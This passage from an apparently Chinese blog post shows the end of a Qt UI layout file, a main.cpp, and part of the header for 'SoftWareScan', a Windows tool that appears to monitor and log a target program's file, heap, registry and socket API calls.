class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>461<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>131<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;headerHighlightSections&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">string</span> <span class="attr">notr</span>=<span class="string">&quot;true&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QProgressBar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;progress_socket&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>70<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>20<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>81<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>100<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QComboBox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;SocketCheckBox&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>370<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>20<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>31<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minimumSize&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>150<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>30<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">number</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTabWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapVerify&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>730<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>560<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>371<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>211<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文楷体<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>14<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">number</span>&gt;</span>0<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapCD&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QListWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapCreateAndDestroy&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>50<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>256<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>161<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapMem&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QListWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;HeapMemoryBlock&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">x</span>&gt;</span>50<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">width</span>&gt;</span>256<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">height</span>&gt;</span>151<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>ApiInfo<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>widget<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>InfoWidget<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>ProcessInfoTable<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>splitter<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>JieHuo<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">zorder</span>&gt;</span>HeapVerify<span class="tag">&lt;/<span class="name">zorder</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">layoutdefault</span> <span class="attr">spacing</span>=<span class="string">&quot;6&quot;</span> <span class="attr">margin</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">include</span> <span class="attr">location</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">connections</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ui</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>主程序<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>m</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>p</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;main.cpp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault">p</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;SoftWareScan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QtWidgets/QApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">	SoftWareScan w;</span><br><span class="line">	w.<span class="built_in">show</span>();</span><br><span class="line">	<span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>W</mi><mi>a</mi><mi>r</mi><mi>e</mi><mi>S</mi><mi>c</mi><mi>a</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>h</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;SoftWareScan.h\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QtWidgets/QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ui_SoftWareScan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QCloseEvent&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QThread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qmetatype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MESSAGEBOXA 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MESSAGEBOXW 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATEFILE 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITEFILE 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READFILE 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLOSEHANDLE 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPCREATE 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPDESTROY 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPFREE 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAPALLOC 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGCREATEKEYEX 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGSETVALUEEX 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGCLOSEKEY 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGOPENKEYEX 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REGDELETEVALUE 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THESOCKET 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIND 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEND 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONNECT 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RECV 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COPYFILEA 21</span></span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">info</span>//消息</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> type,Num;<span class="comment">//消息拦截API类型</span></span><br><span class="line">	SYSTEMTIME st;</span><br><span class="line">	<span class="keyword">char</span> Name[<span class="number">10</span>][<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//键</span></span><br><span class="line">	<span class="keyword">char</span> Value[<span class="number">10</span>][<span class="number">70</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//值</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//注册自定义类型</span></span><br><span class="line"> <span class="built_in">Q_DECLARE_METATYPE</span>(info);</span><br><span class="line"> <span class="comment">//发现recvinfo作为全局变量在被两个线程使用时会因为时间的关系丢掉一些包</span></span><br><span class="line"> <span class="comment">//于是用信号与槽传递自定义类型参数来解决这个问题</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QT_BEGIN_NAMESPACE</span><br><span class="line"><span class="keyword">namespace</span> Ui &#123;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">SoftWareScanClass</span>;</span></span><br><span class="line">&#125; <span class="comment">// namespace Ui</span></span><br><span class="line">QT_END_NAMESPACE</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> :</span> <span class="keyword">public</span> QThread</span><br><span class="line">&#123;</span><br><span class="line">	Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	map&lt;string, <span class="keyword">int</span>&gt; HeapBlock;<span class="comment">//动态记录创建的堆块</span></span><br><span class="line">	map&lt;string, map&lt;string, <span class="keyword">int</span>&gt;&gt; HeapMem;<span class="comment">//动态记录申请的堆内存块</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">StopThread</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">char</span>* filepath)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">GetFileName</span><span class="params">(<span class="keyword">char</span>* filepath, <span class="keyword">char</span>* filename)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">GetStatus</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">ModifyProcessStatus</span><span class="params">(<span class="keyword">bool</span> status)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">checkInfo</span><span class="params">(info tempinfo)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">GetLastFolder</span><span class="params">(<span class="keyword">char</span>* filePath, string&amp; folder)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">GetFileSize</span><span class="params">(<span class="keyword">int</span> size)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">bool</span> running;</span><br><span class="line">	<span class="keyword">char</span> filePath[<span class="number">256</span>], fileName[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">int</span> fileSize;<span class="comment">//加载文件的大小，用于判断是否进行自我复制</span></span><br><span class="line">	map&lt;string , string&gt; filemap;</span><br><span class="line">	unordered_set&lt;string&gt; folderset;</span><br><span class="line">	unordered_set&lt;string&gt; filenameset;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">signals:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newInfo</span><span class="params">(info recvinfo)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newStatus</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="comment">//void newProcessInfo(PROCESS_INFORMATION pi);</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newProcessName</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newProcessID</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newProcessHandle</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newHeapInfo</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newRegInfo</span><span class="params">(<span class="keyword">int</span> handle, QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newFileInfo</span><span class="params">(<span class="keyword">int</span> handle, QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newSocketInfo</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">newHeapBlock</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoftWareScan</span> :</span> <span class="keyword">public</span> QWidget</span><br><span class="line">&#123;</span><br><span class="line">	Q_OBJECT</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	MyThread threadA;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">closeEvent</span><span class="params">(QCloseEvent* event)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">SoftWareScan</span>(QWidget *parent = Q_NULLPTR);</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">InitUI</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span> slots:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_FileOpen_clicked</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_StartScan_clicked</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_StopThread_clicked</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_CleanInfo_clicked</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">FileInfoShow</span><span class="params">(QString filepath)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">FileInfoWindow</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">APIInfoWindow</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">InitCheck</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">InitJieHuo</span><span class="params">()</span></span>;<span class="comment">//截获信息Tab</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">InitExceptionTab</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">ProcessInfoTable</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_threadA_newStatus</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_threadA_newInfo</span><span class="params">(info recvinfo)</span></span>;</span><br><span class="line">	<span class="comment">//void on_threadA_newProcessInfo(PROCESS_INFORMATION pi);</span></span><br><span class="line">	<span class="comment">//槽函数不能简单的传递结构体</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_threadA_newProcessName</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_threadA_newProcessID</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">on_threadA_newProcessHandle</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="comment">//下面列举checkbox发生信号变化时的槽函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_MessageA</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_MessageB</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_CreateFile</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_WriteFile</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_ReadFile</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_CloseHandle</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_HeapCreate</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_HeapDestroy</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_HeapFree</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_HeapAlloc</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_RegCreateKeyEx</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_RegSetValueEx</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_RegCloseKey</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_RegOpenKeyEx</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_RegDeleteValue</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span 